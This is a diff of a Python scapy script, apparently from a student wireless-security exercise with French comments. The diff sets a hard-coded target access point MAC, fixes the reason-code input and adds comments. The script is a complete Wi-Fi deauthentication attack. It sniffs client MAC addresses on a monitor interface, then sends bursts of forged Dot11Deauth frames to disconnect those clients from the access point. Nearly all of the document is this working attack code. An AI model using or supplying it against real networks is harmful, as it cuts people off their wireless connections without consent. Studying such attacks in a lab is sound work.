@@ -12,34 +12,34 @@ from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 import sys
 
 interface = "wlan0mon"
-accessPointBSSID = "dc:a5:f4:60:c3:52" 
+accessPointBSSID = "7c:95:f3:00:79:d0" 
 clientsBSSID = []
 pkt = ""
 
 def sniffing(packetToSniff):
-    
-    #if packetToSniff.type == 0:
-        
-    #print(packetToSniff.addr1)
+
     # on enregistre  l'adresse mac source si elle n'est pas encore present dans la liste        
     if packetToSniff.addr1 not in clientsBSSID :
         print(packetToSniff.addr1)
         clientsBSSID.append(packetToSniff.addr1)
 
-reasonNumber = input('Choose number of reason code : \n \
+reasonNumber = int(input('Choisissez une raison de déauthentification : \n \
 1 - Unspecified\n \
 4 - Disassociated due to inactivity\n \
 5 - Disassociated because AP is unable to handle all currently associated stations\n \
 8 - Deauthenticated because sending STA is leaving BSS\n\n \
-Reason: ')
+Reason: '))
 
+# On sniffe en passant en fonction de callback la fonction sniffing
 sniff(count=400, iface=interface, prn=sniffing)
          
 for x in clientsBSSID :
-    if(reasonNumber == 1 or reasonNumber == 4 or reasonNumber == 5):
+    if(reasonNumber == 1 or reasonNumber == 4 or reasonNumber == 5): # Raisons pour laquelle il faut envoyer les trames à L'AP
         pkt = RadioTap() / Dot11(addr1=x, addr2=accessPointBSSID, addr3=accessPointBSSID) / Dot11Deauth(reason=reasonNumber)
-    elif (reasonNumber == 8):
+    elif (reasonNumber == 8):  # Raison pour laquelle il faut envoyer les trames au client
         pkt = RadioTap() / Dot11(addr1=accessPointBSSID, addr2=x, addr3=x) / Dot11Deauth(reason=reasonNumber)
-    for y in range(64):    
+    else:
+        break;
+    for y in range(32):    
         sendp(pkt, iface=interface)
     
